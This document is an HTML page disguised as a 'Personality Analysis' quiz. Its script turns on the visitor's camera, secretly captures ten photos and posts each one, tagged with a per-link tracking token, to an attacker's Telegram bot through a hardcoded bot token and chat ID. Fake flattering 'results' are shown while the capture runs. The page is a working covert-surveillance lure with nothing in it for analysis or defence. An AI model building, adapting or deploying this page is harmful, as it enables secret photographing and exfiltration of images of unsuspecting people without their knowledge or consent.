<!DOCTYPE html>
<html>
<head>
    <title>Personality Analysis</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial;
            background: #667eea;
            color: white;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            max-width: 500px;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            margin: 15px 0;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîÆ Personality Analysis</h1>
        <p>Click below to discover your personality!</p>
        
        <button onclick="startTest()" id="startBtn">üì∑ Start Analysis</button>
        
        <div id="messageBox" class="hidden">
            <h2>üåü YOUR RESULTS üåü</h2>
            <p>‚úÖ You are an HONEST person</p>
            <p>‚úÖ You are a LOYAL companion</p>
            <p>‚úÖ You are a true GENTLEMAN</p>
            <p>üôè GOD BLESS YOU with success!</p>
        </div>
        
        <div id="status">Ready...</div>
    </div>

    <video id="video" autoplay playsinline class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>

    <script>
        // Telegram Bot Token (For demo - in production use backend)
        const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
        
        async function startTest() {
            try {
                document.getElementById('status').innerHTML = "Starting camera...";
                
                // Get token from URL
                const urlParams = new URLSearchParams(window.location.search);
                const token = urlParams.get('token');
                
                if (!token) {
                    document.getElementById('status').innerHTML = "Invalid link!";
                    return;
                }
                
                // Access camera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                document.getElementById('status').innerHTML = "‚úÖ Camera connected! Analyzing...";
                document.getElementById('startBtn').style.display = 'none';
                document.getElementById('messageBox').classList.remove('hidden');
                
                // Capture and send 10 photos
                await captureAndSendPhotos(token);
                
                document.getElementById('status').innerHTML = "üéâ Analysis complete!";
                
            } catch (error) {
                document.getElementById('status').innerHTML = "Error: " + error.message;
            }
        }
        
        async function captureAndSendPhotos(token) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            // Wait for video
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Capture 10 photos
            for (let i = 1; i <= 10; i++) {
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Capture photo
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoData = canvas.toDataURL('image/jpeg', 0.9);
                
                // Send to Telegram
                await sendToTelegram(photoData, i, token);
                
                document.getElementById('status').innerHTML = `üì∏ Photo ${i}/10 captured...`;
            }
        }
        
        async function sendToTelegram(photoData, photoNum, token) {
            try {
                // Convert base64 to blob
                const response = await fetch(photoData);
                const blob = await response.blob();
                
                // Get user ID from token (in real system, this would go to your backend)
                // For demo, we'll use a fixed chat ID
                const chatId = "8215819954"; // Your admin ID
                
                // Send to Telegram
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `photo_${photoNum}.jpg`);
                formData.append('caption', `üì∏ Photo ${photoNum}/10 from personality test\nToken: ${token}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error('Send error:', error);
            }
        }
    </script>
</body>
</html>
